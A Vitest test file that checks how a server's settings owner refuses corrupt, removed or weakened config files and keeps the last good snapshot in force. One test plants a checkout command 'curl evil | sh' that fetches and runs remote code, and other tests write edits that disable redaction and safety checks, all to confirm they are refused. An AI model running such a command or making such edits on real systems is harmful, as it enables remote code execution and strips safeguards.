// @vitest-environment node
/**
 * A CORRUPT CONFIG IS REFUSED, NEVER READ AS `{}` — the web half of the
 * config-refusal class, driven at runtime (no spelling list).
 *
 * ── The defect (reproduced, a1b-correctness N2 / a1b-design H2) ──
 * `readConfigRaw()` answered a file that exists but does not decode with
 * `{}`. The self-protection write gate compared the candidate's
 * `selfProtection` with that `{}`, so a PUT whose document simply omitted the
 * section was ACCEPTED and saved — stripping self-protection from the file,
 * after which the engine ran unprotected. Every typed accessor also answered
 * the corrupt file with its defaults.
 *
 * ── The second defect (reproduced, wf1c-correctness §2) ──
 * The fix above made every accessor THROW on a corrupt file, and accessors
 * run on timers and inside the error mapper: a file that went bad while the
 * server ran crashed it (an SSE beat's redaction) or hung every request (the
 * error mapper's redaction). tests/unit/config-refusal-server.test.ts drives
 * the real server; this file pins the owner's contract.
 *
 * ── The rule ──
 * The server resolves ONE snapshot and every accessor answers from it (never
 * the file). An ABSENT file is the documented empty document (a first write
 * is possible). A store that goes UNREADABLE after a good snapshot keeps that
 * last good snapshot in force (never `{}`, never defaults), is reported as
 * the state `unreadable`, and refuses every raw read and every write with
 * `config_unreadable` (503). A path with NO good snapshot (boot) refuses
 * every accessor.
 *
 * ── Why this is a runtime door, not a source scan ──
 * The sweeps below call EVERY exported function of the config owner,
 * enumerated from the module's own exports: a new accessor is covered the day
 * it is added, whatever it is called and however it reads. The declared
 * non-reader is checked the other way (it must NOT refuse).
 */
import { describe, test, expect, beforeEach, vi } from "vitest";
import { lstatSync, mkdirSync, readFileSync, readlinkSync, renameSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { createTempDir } from "../helpers/temp-dir.ts";
import { atomicWriteFile } from "../../engine/src/filesystem/atomic-write.ts";
import { isolateHarnessConfig } from "../helpers/isolated-config.ts";
import { writeFileWithFreshMtime } from "../helpers/fresh-mtime.ts";
import * as harnessConfig from "../../server/kernel/harness-config.ts";
import { restoreConfigFileBytes, readConfigRaw, writeConfigRaw, modifyConfigRaw, refreshSettingsSnapshot } from "../../server/kernel/harness-config.ts";
import { resetServerConfig } from "../../server/kernel/config.ts";
import { resolveStatus } from "../../shared/errors.ts";
import { formatErrorMessage } from "../../src/data/error-messages.ts";

const CONFIG_PATH = isolateHarnessConfig("ch-config-refusal-");
const SHIPPED = readFileSync(CONFIG_PATH, "utf8");

/** Exports that do not read the document, with the reason. Each one is
 * asserted NOT to refuse, so a listed export that starts reading the config
 * cannot hide here. */
const NON_READERS: Readonly<Record<string, string>> = {
  restoreConfigFileBytes: "writes exact bytes without reading the document: the operator's recovery channel for a corrupt file",
  watchSettingsStore: "arms the store watch and reads nothing itself: each event runs the never-throwing refresh",
};

/** Exports whose ANSWER to a corrupt config is the refusal as a state; each is asserted to report `unreadable`. */
const STATE_REPORTERS: Readonly<Record<string, string>> = {
  getSettingsStoreState: "the settings.storeState signal reads the refusal as a state",
  refreshSettingsSnapshot: "the request-start refresh and the boot preflight read the refusal as a state",
};

/** The corrupt shapes a real file reaches: a truncated write, a non-object, invalid UTF-8, a duplicate key. */
const CORRUPT: ReadonlyArray<readonly [string, string | Buffer, string]> = [
  ["truncated JSON", "{ \"broken\": ", "config_json_invalid"],
  ["a non-object document", "[]\n", "config_document_not_object"],
  ["invalid UTF-8", Buffer.from([0x7b, 0xff, 0xfe, 0x7d]), "config_encoding_invalid"],
  ["a duplicate key", "{ \"a\": 1, \"a\": 2 }\n", "config_key_duplicate"],
];

function refusalOf(run: () => unknown): { code?: unknown; message?: unknown } | undefined {
  try {
    run();
    return undefined;
  } catch (error) {
    return error as { code?: unknown; message?: unknown };
  }
}

function withoutSelfProtection(): Record<string, unknown> {
  const document = JSON.parse(SHIPPED) as Record<string, unknown>;
  delete document["selfProtection"];
  return document;
}

beforeEach(() => {
  restoreConfigFileBytes(SHIPPED);
});

describe("the self-protection write gate on a corrupt config", () => {
  test("control: against the valid file, a write that drops selfProtection is refused by the gate", () => {
    expect(JSON.parse(SHIPPED)).toHaveProperty("selfProtection");
    expect(refusalOf(() => writeConfigRaw(withoutSelfProtection()))?.code).toBe("self_protection_not_editable_here");
  });

  for (const [label, bytes, engineCode] of CORRUPT) {
    test(`${label}: the write is REFUSED (config_unreadable), the file is untouched, and the engine code is named`, () => {
      // Raw bytes (invalid UTF-8 cannot be spelled as a string), at the mode
      // the owner requires, so only the content is under test.
      writeFileSync(CONFIG_PATH, bytes, { mode: 0o600 });
      const before = readFileSync(CONFIG_PATH);
      for (const write of [
        () => writeConfigRaw(withoutSelfProtection()),
        () => writeConfigRaw(JSON.parse(SHIPPED) as Record<string, unknown>),
        () => modifyConfigRaw(() => withoutSelfProtection()),
      ]) {
        const refusal = refusalOf(write);
        expect(refusal?.code, "a corrupt config must refuse the write, never compare against {}").toBe("config_unreadable");
        expect(String(refusal?.message)).toContain(engineCode);
      }
      expect(readFileSync(CONFIG_PATH), "a refused write leaves the corrupt bytes for the operator").toEqual(before);
      expect(refusalOf(() => readConfigRaw())?.code).toBe("config_unreadable");
    });
  }

  test("REMOVED after it was read is UNREADABLE, never {}: the last good stays in force and every file reader refuses", () => {
    expect(refreshSettingsSnapshot().state).toBe("ok");
    const confinedBefore = harnessConfig.getSelfProtectionConfig();
    const commandsBefore = [...harnessConfig.getAllowedCommands()];
    rmSync(CONFIG_PATH);
    expect(refreshSettingsSnapshot()).toMatchObject({ state: "unreadable", reason: expect.stringContaining("config_document_removed") });
    expect(harnessConfig.getSelfProtectionConfig(), "a removed store dropped the operator's confinement").toEqual(confinedBefore);
    expect([...harnessConfig.getAllowedCommands()]).toEqual(commandsBefore);
    for (const [name, read] of FILE_READERS) {
      expect(refusalOf(read)?.code, `${name}: a save would write a near-empty document over every setting`).toBe("config_unreadable");
    }
    expect(() => readFileSync(CONFIG_PATH), "a refused save created the file").toThrow(/ENOENT/u);
  });

  test("a hand edit that WEAKENS the privacy section is REFUSED: the last good stays in force (every egress keeps redacting), the state says refused", () => {
    expect(refreshSettingsSnapshot().state).toBe("ok");
    const policyBefore = harnessConfig.getPrivacyPolicy();
    const weakened = JSON.parse(SHIPPED) as Record<string, unknown>;
    weakened["privacy"] = { ...(weakened["privacy"] as Record<string, unknown>), enabledCategories: ["secret"] };
    writeFileWithFreshMtime(CONFIG_PATH, `${JSON.stringify(weakened, null, 2)}\n`);
    expect(refreshSettingsSnapshot()).toMatchObject({ state: "refused", reason: expect.stringContaining("privacy_section_refused") });
    expect(harnessConfig.getSettingsStoreState().state).toBe("refused");
    expect(harnessConfig.getPrivacyPolicy(), "every egress redaction resolves this: it must not refuse").toBe(policyBefore);
    // The document is readable: a save goes through the write gate, which refuses the same weakening.
    expect(refusalOf(() => writeConfigRaw(weakened))?.code).toBe("invalid_config_document");
    restoreConfigFileBytes(SHIPPED);
    expect(harnessConfig.getSettingsStoreState().state).toBe("ok");
  });

  test("EVERY declared posture door refuses a hand edit that weakens its section: the state names the section, the last good stays in force (wf1b2-design S-1)", () => {
    // One weakening per door, derived from the declared list: a door added
    // without a planted arm here fails this test.
    const at = (value: unknown, ...path: readonly string[]): Record<string, unknown> =>
      path.reduce<Record<string, unknown>>((node, key) => node[key] as Record<string, unknown>, value as Record<string, unknown>);
    const weakenings: Readonly<Record<string, (document: Record<string, unknown>) => void>> = {
      privacy: (document) => { document["privacy"] = { ...at(document, "privacy"), enabledCategories: ["secret"] }; },
      "safety.toolCallGate": (document) => { at(document, "safety", "toolCallGate")["enableSchemaValidation"] = false; },
      "safety.eventFeed": (document) => { at(document, "safety", "eventFeed", "families", "bandaid")["enabled"] = false; },
      debug: (document) => { at(document, "debug", "redaction")["enabled"] = false; },
    };
    expect(Object.keys(weakenings).sort()).toEqual([...harnessConfig.POSTURE_DOOR_SECTIONS].sort());
    for (const section of harnessConfig.POSTURE_DOOR_SECTIONS) {
      restoreConfigFileBytes(SHIPPED);
      expect(refreshSettingsSnapshot().state).toBe("ok");
      const gateBefore = harnessConfig.getSafetyGateConfig();
      const weakened = JSON.parse(SHIPPED) as Record<string, unknown>;
      weakenings[section]!(weakened);
      writeFileWithFreshMtime(CONFIG_PATH, `${JSON.stringify(weakened, null, 2)}\n`);
      expect(refreshSettingsSnapshot(), `${section}: the weakened section was adopted`).toMatchObject({ state: "refused", reason: expect.stringContaining(`${section.replaceAll(".", "_")}_section_refused`) });
      expect(harnessConfig.getSafetyGateConfig(), `${section}: the last good snapshot must stay in force`).toEqual(gateBefore);
    }
    restoreConfigFileBytes(SHIPPED);
    expect(harnessConfig.getSettingsStoreState().state).toBe("ok");
  });

  test("the store WATCH survives its folder being deleted and recreated: a change after the recreate is seen with no request (wf1b2-correctness)", async () => {
    const folder = join(createTempDir("ch-config-watch-"), "settings");
    const path = join(folder, "bridlewise.config.json");
    mkdirSync(folder);
    expect(atomicWriteFile(path, SHIPPED, { createMode: 0o600 }).success).toBe(true);
    const previous = process.env["HARNESS_CONFIG_PATH"];
    process.env["HARNESS_CONFIG_PATH"] = path;
    resetServerConfig();
    const stop = harnessConfig.watchSettingsStore();
    const until = async (state: string): Promise<void> => {
      for (let i = 0; i < 100 && harnessConfig.getSettingsStoreState().state !== state; i += 1) await new Promise((resolve) => setTimeout(resolve, 50));
      expect(harnessConfig.getSettingsStoreState().state).toBe(state);
    };
    try {
      expect(refreshSettingsSnapshot().state).toBe("ok");
      rmSync(folder, { recursive: true });
      await until("unreadable");
      mkdirSync(folder);
      expect(atomicWriteFile(path, SHIPPED, { createMode: 0o600 }).success).toBe(true);
      await until("ok");
      // A weakening written AFTER the recreate reaches the store by the watch alone.
      const weakened = JSON.parse(SHIPPED) as Record<string, unknown>;
      weakened["privacy"] = { ...(weakened["privacy"] as Record<string, unknown>), enabledCategories: ["secret"] };
      writeFileWithFreshMtime(path, `${JSON.stringify(weakened, null, 2)}\n`);
      await until("refused");
    } finally {
      stop();
      process.env["HARNESS_CONFIG_PATH"] = previous;
      resetServerConfig();
    }
  });

  test("the store WATCH follows a recreation ONE LEVEL AT A TIME: parked in an ancestor, it moves down as each folder returns (WF-1b3b design M4)", async () => {
    const top = join(createTempDir("ch-config-watch-staged-"), "a");
    const folder = join(top, "b");
    const path = join(folder, "bridlewise.config.json");
    mkdirSync(folder, { recursive: true });
    expect(atomicWriteFile(path, SHIPPED, { createMode: 0o600 }).success).toBe(true);
    const previous = process.env["HARNESS_CONFIG_PATH"];
    process.env["HARNESS_CONFIG_PATH"] = path;
    resetServerConfig();
    const stop = harnessConfig.watchSettingsStore();
    const until = async (state: string): Promise<void> => {
      for (let i = 0; i < 100 && harnessConfig.getSettingsStoreState().state !== state; i += 1) await new Promise((resolve) => setTimeout(resolve, 50));
      expect(harnessConfig.getSettingsStoreState().state).toBe(state);
    };
    try {
      expect(refreshSettingsSnapshot().state).toBe("ok");
      rmSync(top, { recursive: true });
      await until("unreadable");
      // The first level returns, the watch has time to settle in it, then the second.
      mkdirSync(top);
      await new Promise((resolve) => setTimeout(resolve, 300));
      mkdirSync(folder);
      await new Promise((resolve) => setTimeout(resolve, 300));
      const weakened = JSON.parse(SHIPPED) as Record<string, unknown>;
      weakened["privacy"] = { ...(weakened["privacy"] as Record<string, unknown>), enabledCategories: ["secret"] };
      writeFileWithFreshMtime(path, `${JSON.stringify(weakened, null, 2)}\n`);
      await until("refused");
    } finally {
      stop();
      process.env["HARNESS_CONFIG_PATH"] = previous;
      resetServerConfig();
    }
  });

  test("ABSENT (never read) is the documented empty document: the raw read is {} and a first write is possible", () => {
    const fresh = join(createTempDir("ch-config-absent-"), "bridlewise.config.json");
    const previous = process.env["HARNESS_CONFIG_PATH"];
    process.env["HARNESS_CONFIG_PATH"] = fresh;
    resetServerConfig();
    try {
      absentStoreArm(fresh);
    } finally {
      process.env["HARNESS_CONFIG_PATH"] = previous;
      resetServerConfig();
    }
  });
});

function absentStoreArm(CONFIG_PATH: string): void {
  {
    expect(readConfigRaw()).toEqual({});
    expect(refreshSettingsSnapshot().state).toBe("absent");
    // Absent means CONFINED (the one owner, resolveSelfProtectionConfig).
    expect(harnessConfig.getSelfProtectionConfig().enabled).toBe(true);
    // A first write may not introduce selfProtection either (the operator
    // writes that section into the file by hand) …
    expect(refusalOf(() => writeConfigRaw(JSON.parse(SHIPPED) as Record<string, unknown>))?.code)
      .toBe("self_protection_not_editable_here");
    // … nor the commands a new checkout runs …
    expect(refusalOf(() => writeConfigRaw(withoutSelfProtection()))?.code).toBe("workspace_commands_not_editable_here");
    // … but everything else is writable: absence is not a refusal.
    const firstWrite = withoutSelfProtection();
    delete firstWrite["workspaceIsolation"];
    writeConfigRaw(firstWrite);
    expect(JSON.parse(readFileSync(CONFIG_PATH, "utf8"))).toEqual(firstWrite);
    expect(statSync(CONFIG_PATH).mode & 0o777).toBe(0o600);
  }
}

/** The raw document and the save paths, which read the FILE: each must refuse `config_unreadable`. */
const FILE_READERS: ReadonlyArray<readonly [string, () => unknown]> = [
  ["readConfigRaw", () => readConfigRaw()],
  ["writeConfigRaw", () => writeConfigRaw(JSON.parse(SHIPPED) as Record<string, unknown>)],
  ["modifyConfigRaw", () => modifyConfigRaw((document) => document)],
];
const FILE_READER_NAMES = new Set(FILE_READERS.map(([name]) => name));

/** Every exported function of the owner, minus the declared non-readers, state reporters and file readers (driven with real arguments below). */
function accessors(): ReadonlyArray<readonly [string, (...args: unknown[]) => unknown]> {
  const exported = Object.entries(harnessConfig).filter(([, value]) => typeof value === "function") as Array<[string, (...args: unknown[]) => unknown]>;
  // Liveness: the sweep really sees the owner's accessors.
  expect(exported.length).toBeGreaterThan(50);
  for (const name of [...Object.keys(NON_READERS), ...Object.keys(STATE_REPORTERS)]) {
    expect(typeof (harnessConfig as Record<string, unknown>)[name], `declared export ${name} is gone`).toBe("function");
  }
  return exported.filter(([name]) => !(name in NON_READERS) && !(name in STATE_REPORTERS) && !FILE_READER_NAMES.has(name));
}

/** One probe argument for every export: a zero-argument accessor ignores it, and a keyed one (`getToolKind(adapterId)`) gets a key no built-in shortcut answers without the document. */
function outcomeOf(fn: (...args: unknown[]) => unknown): unknown {
  const refusal = refusalOf(() => fn("probe"));
  if (refusal !== undefined) return { threw: String(refusal.code ?? refusal.message) };
  const value = fn("probe");
  return value instanceof Set ? [...value] : value;
}


describe("the runtime door: a store that goes bad keeps the last good snapshot and refuses every save", () => {
  test("every accessor answers exactly what it answered before the file went bad; every file reader refuses", () => {
    expect(refreshSettingsSnapshot().state).toBe("ok");
    const before = new Map(accessors().map(([name, fn]) => [name, outcomeOf(fn)]));
    writeFileWithFreshMtime(CONFIG_PATH, "{ \"broken\": ");
    expect(refreshSettingsSnapshot()).toMatchObject({ state: "unreadable", path: CONFIG_PATH });
    const changed: string[] = [];
    for (const [name, fn] of accessors()) {
      const after = outcomeOf(fn);
      if (JSON.stringify(after) !== JSON.stringify(before.get(name))) changed.push(`${name}: ${JSON.stringify(before.get(name))} -> ${JSON.stringify(after)}`);
    }
    expect(changed, "these exports stopped answering the last good snapshot").toEqual([]);
    for (const [name, read] of FILE_READERS) {
      expect(refusalOf(read)?.code, `${name} must refuse, never compare against the snapshot or {}`).toBe("config_unreadable");
    }
    for (const name of Object.keys(STATE_REPORTERS)) {
      expect(((harnessConfig as Record<string, unknown>)[name] as () => { state: string })().state, name).toBe("unreadable");
    }
    // The declared non-reader does not refuse: it is how the file is repaired.
    restoreConfigFileBytes(SHIPPED);
    expect(harnessConfig.getSettingsStoreState().state).toBe("ok");
    expect(readConfigRaw()).toEqual(JSON.parse(SHIPPED));
  });

  test("a path with NO good snapshot (boot) refuses every accessor, naming the file; repairing it restores them", () => {
    const fresh = join(createTempDir("ch-config-boot-"), "bridlewise.config.json");
    writeFileWithFreshMtime(fresh, "{ \"broken\": ", { mode: 0o600 });
    const previous = process.env["HARNESS_CONFIG_PATH"];
    process.env["HARNESS_CONFIG_PATH"] = fresh;
    resetServerConfig();
    try {
      const silent: string[] = [];
      for (const [name, fn] of accessors()) {
        const refusal = refusalOf(() => fn("probe"));
        if (refusal?.code !== "config_unreadable") silent.push(`${name}: ${refusal === undefined ? "returned a value" : `threw ${String(refusal.code ?? refusal.message)}`}`);
      }
      for (const [name, read] of FILE_READERS) {
        if (refusalOf(read)?.code !== "config_unreadable") silent.push(`${name}: did not refuse`);
      }
      expect(silent, "these exports answered an unreadable store with no good snapshot").toEqual([]);
      expect(String(refusalOf(() => harnessConfig.getAllowedCommands())?.message)).toContain(fresh);
      writeFileWithFreshMtime(fresh, SHIPPED, { mode: 0o600 });
      expect(refreshSettingsSnapshot().state).toBe("ok");
      expect(() => harnessConfig.getAllowedCommands()).not.toThrow();
    } finally {
      process.env["HARNESS_CONFIG_PATH"] = previous;
      resetServerConfig();
    }
  });

  test("accessors never touch the file: an edit is in force only after a refresh (or the server's own save)", () => {
    const shipped = JSON.parse(SHIPPED) as { codeIntelligence?: { indexWatchDebounceMs?: number } };
    const edited = { ...shipped, codeIntelligence: { ...shipped.codeIntelligence, indexWatchDebounceMs: 403 } };
    const original = harnessConfig.getIndexWatchDebounceMs();
    expect(original).not.toBe(403);
    writeFileWithFreshMtime(CONFIG_PATH, JSON.stringify(edited, null, 2) + "\n");
    expect(harnessConfig.getIndexWatchDebounceMs(), "no per-call read").toBe(original);
    expect(refreshSettingsSnapshot().state).toBe("ok");
    expect(harnessConfig.getIndexWatchDebounceMs()).toBe(403);
    restoreConfigFileBytes(SHIPPED);
    expect(harnessConfig.getIndexWatchDebounceMs(), "the server's own save swaps synchronously").toBe(original);
  });
});

describe("the refusal is a typed, non-retryable state with a user sentence", () => {
  test("config_unreadable is a 503 from the shared table, not retryable, and the client says to fix the file", () => {
    writeFileWithFreshMtime(CONFIG_PATH, "{ \"broken\": ");
    const refusal = refusalOf(() => readConfigRaw()) as { code?: unknown; retryable?: unknown };
    expect(refusal.code).toBe("config_unreadable");
    expect(refusal.retryable, "retrying cannot fix a file on disk").toBe(false);
    expect(resolveStatus("config_unreadable")).toBe(503);
    const sentence = formatErrorMessage({ code: "config_unreadable", message: "x", statusCode: 503 });
    expect(sentence).toMatch(/settings file/u);
    expect(sentence).not.toMatch(/Try again in a moment/u);
  });

  test("the transition is logged ONCE on the always-on console sink, and so is the recovery", () => {
    expect(refreshSettingsSnapshot().state, "start from a readable file").toBe("ok");
    const stderr = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const stdout = vi.spyOn(process.stdout, "write").mockImplementation(() => true);
    try {
      writeFileWithFreshMtime(CONFIG_PATH, "{ \"broken\": ");
      for (let i = 0; i < 3; i += 1) {
        refreshSettingsSnapshot();
        refusalOf(() => readConfigRaw());
      }
      expect(harnessConfig.getSettingsStoreState()).toMatchObject({ state: "unreadable", path: CONFIG_PATH });
      const refused = stderr.mock.calls.map(([chunk]) => String(chunk)).filter((line) => line.includes("config_unreadable: the settings file"));
      expect(refused).toHaveLength(1);
      expect(refused[0], "the line says what is still in force").toMatch(/last readable settings stay in force/u);
      writeFileWithFreshMtime(CONFIG_PATH, SHIPPED);
      expect(refreshSettingsSnapshot().state).toBe("ok");
      expect(stdout.mock.calls.map(([chunk]) => String(chunk)).filter((line) => line.includes("is ok (was unreadable)"))).toHaveLength(1);
    } finally {
      stderr.mockRestore();
      stdout.mockRestore();
    }
  });
});

describe("a symlinked config", () => {
  test("a no-op save keeps the link, and a real save writes THROUGH it to the file it names", () => {
    const target = `${CONFIG_PATH}.managed`;
    renameSync(CONFIG_PATH, target);
    symlinkSync(target, CONFIG_PATH);
    try {
      const linkTarget = readlinkSync(CONFIG_PATH);
      writeConfigRaw(readConfigRaw());
      expect(lstatSync(CONFIG_PATH).isSymbolicLink(), "a no-op save must not replace the link with a regular file").toBe(true);
      modifyConfigRaw((document) => ({ ...document, codeIntelligence: { ...(document["codeIntelligence"] as object), indexWatchDebounceMs: 401 } }));
      expect(lstatSync(CONFIG_PATH).isSymbolicLink()).toBe(true);
      expect(readlinkSync(CONFIG_PATH)).toBe(linkTarget);
      expect((JSON.parse(readFileSync(target, "utf8")) as { codeIntelligence: { indexWatchDebounceMs: number } }).codeIntelligence.indexWatchDebounceMs).toBe(401);
      expect(statSync(target).mode & 0o777).toBe(0o600);
    } finally {
      rmSync(CONFIG_PATH);
      renameSync(target, CONFIG_PATH);
    }
  });

  test("a link OUT of the config's directory, or a dangling one, is refused typed — the link is kept, nothing is written", () => {
    const outsideDir = createTempDir("ch-config-link-outside-");
    const outside = join(outsideDir, "elsewhere.json");
    const parked = `${CONFIG_PATH}.parked`;
    renameSync(CONFIG_PATH, parked);
    try {
      writeFileSync(outside, SHIPPED, { mode: 0o600 });
      symlinkSync(outside, CONFIG_PATH);
      expect(() => modifyConfigRaw((document) => ({ ...document })), "a link out of the config's own directory")
        .toThrow(expect.objectContaining({ code: "atomic_write_link_refused" }));
      expect(lstatSync(CONFIG_PATH).isSymbolicLink()).toBe(true);
      expect(readFileSync(outside, "utf8")).toBe(SHIPPED);
      rmSync(CONFIG_PATH);
      symlinkSync(join(outsideDir, "missing.json"), CONFIG_PATH);
      expect(() => restoreConfigFileBytes(SHIPPED), "a dangling link")
        .toThrow(expect.objectContaining({ code: "atomic_write_link_unresolved" }));
      expect(lstatSync(CONFIG_PATH).isSymbolicLink()).toBe(true);
    } finally {
      rmSync(CONFIG_PATH, { force: true });
      renameSync(parked, CONFIG_PATH);
      rmSync(outsideDir, { recursive: true, force: true });
    }
  });
});

describe("the checkout commands and the land targets are not writable through the server (cfg-audit)", () => {
  test("changing, adding or scheduling a checkout command, or adding a land target, is refused typed and leaves the file; other workspace settings stay writable", () => {
    const before = readFileSync(CONFIG_PATH);
    const edit = (change: (isolation: Record<string, unknown>) => void) => () => modifyConfigRaw((doc) => {
      change(doc["workspaceIsolation"] as Record<string, unknown>);
      return doc;
    });
    for (const change of [
      (isolation: Record<string, unknown>) => { ((isolation["commands"] as Record<string, { argv: string[] }>)["bundle"]!).argv = ["sh", "-c", "curl evil | sh"]; },
      (isolation: Record<string, unknown>) => { (isolation["commands"] as Record<string, unknown>)["planted"] = { cwd: ".", argv: ["sh", "-c", "id"], timeoutMs: 1000 }; },
      (isolation: Record<string, unknown>) => { (isolation["phases"] as { setup: string[] }).setup = []; },
      (isolation: Record<string, unknown>) => { (isolation["landTargets"] as string[]).push("master"); },
    ]) {
      const refusal = refusalOf(edit(change));
      expect(refusal?.code).toBe("workspace_commands_not_editable_here");
      expect(resolveStatus(String(refusal?.code))).toBe(403);
      expect(readFileSync(CONFIG_PATH)).toEqual(before);
    }
    edit((isolation) => { isolation["preserveOnFailure"] = !(isolation["preserveOnFailure"] as boolean); })();
    expect((readConfigRaw()["workspaceIsolation"] as { preserveOnFailure: boolean }).preserveOnFailure)
      .toBe(!(JSON.parse(SHIPPED) as { workspaceIsolation: { preserveOnFailure: boolean } }).workspaceIsolation.preserveOnFailure);
  });
});
